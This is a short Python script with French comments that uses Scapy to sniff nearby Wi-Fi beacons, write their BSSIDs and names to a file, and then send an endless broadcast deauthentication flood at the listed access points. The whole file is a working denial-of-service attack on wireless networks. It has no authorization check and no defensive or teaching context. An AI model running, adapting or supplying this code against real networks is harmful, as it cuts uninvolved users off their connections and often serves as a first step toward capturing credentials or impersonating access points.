import os
import time
import logging
from scapy.all import *

# Configuration du logging
logging.basicConfig(level=logging.INFO)

# Définir l'interface à utiliser (e.g. wlan0, wlan1, etc.)
interface = "wlan1"  # Remplacez par votre interface réseau Wi-Fi

def scan_wifi():
    # Scan des réseaux Wi-Fi
    logging.info("Début du scan des réseaux Wi-Fi...")
    packets = sniff(iface=interface, count=100, timeout=10)

    # Récupération des informations des réseaux Wi-Fi
    networks = []
    for packet in packets:
        if packet.haslayer(Dot11Beacon):
            # Récupération de l'adresse MAC du réseau
            mac_address = packet[Dot11].addr3

            # Récupération du nom du réseau
            ssid = None
            for elt in packet[Dot11Elt]:
                if elt.ID == 0:
                    ssid = elt.info.decode("utf-8")
                    break

            # Ajout du réseau à la liste
            networks.append((mac_address, ssid))

    # Sauvegarde des informations dans un fichier .txt
    with open("networks.txt", "w") as f:
        for network in networks:
            f.write(f"{network[0]} - {network[1]}\n")

    logging.info("Scan des réseaux Wi-Fi terminé.")
    return networks

def deauth_attack(ap_address):
    # Créer le paquet de désauthentification
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address) / Dot11Deauth(reason=7)
    
    while True:
        # Envoyer le paquet
        sendp(packet, iface=interface, verbose=0)
        logging.info(f"Paquet de désauthentification envoyé à {ap_address}")
        time.sleep(1)

if __name__ == "__main__":
    networks = scan_wifi()

    # Lire le fichier et effectuer l'attaque de désauthentification
    with open("networks.txt", "r") as f:
        for line in f:
            mac_address = line.split(" - ")[0]
            logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address}")
            deauth_attack(mac_address)
